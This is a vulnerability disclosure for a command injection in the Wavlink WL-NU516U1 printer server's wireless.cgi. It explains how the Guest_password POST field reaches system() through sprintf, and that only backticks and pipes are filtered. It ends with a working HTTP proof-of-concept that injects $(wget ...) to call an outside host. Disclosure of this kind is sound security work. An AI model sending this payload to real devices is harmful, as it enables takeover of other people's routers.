# WL-NU516U1 wireless.cgi GuestWifi Guest_password Command Injection

Vendor: Wavlink

Product: WL-NU516U1

Version: M16U1_V240425
Firmware Download: https://docs.wavlink.xyz/Firmware/?category=USB+Printer+Server&model=WL-NU516U1-A

Vulnerability: Command Injection

CVE: TBD

## Affected version

Wavlink WL-NU516U1 M16U1_V240425

## Vulnerability details

Wavlink WL-NU516U1 M16U1_V240425 contains a command injection vulnerability in /cgi-bin/wireless.cgi.

When the `page` parameter is set to `GuestWifi`, the function `sub_4032E4` is invoked.

The function reads the `Guest_password` POST parameter via `sub_405EA8`, which performs URL decoding but no sanitization.

The decoded value is passed to `sub_407504("rai1", "WPAPSK", v45)`, which constructs a shell command:

```c
sprintf(v8, "iwpriv %s set %s=\"%s\"", "rai1", "WPAPSK", v45);
system(v8);
```

The input filter `sub_4074A0` only blocks backtick (`` ` ``) and pipe (`|`) characters. The `$(cmd)` syntax is not filtered, allowing arbitrary command execution.

Conditions: `guestEn=1`, `Authentication_Mode=2` (non-OPEN mode).

## Proof of Concept (PoC)

```http
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.6.3
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.6.3/
Connection: close
Content-Length: 96

page=GuestWifi&guestEn=1&Authentication_Mode=2&Guest_password=$(wget http://192.168.6.1:6666/guest_pw)
```
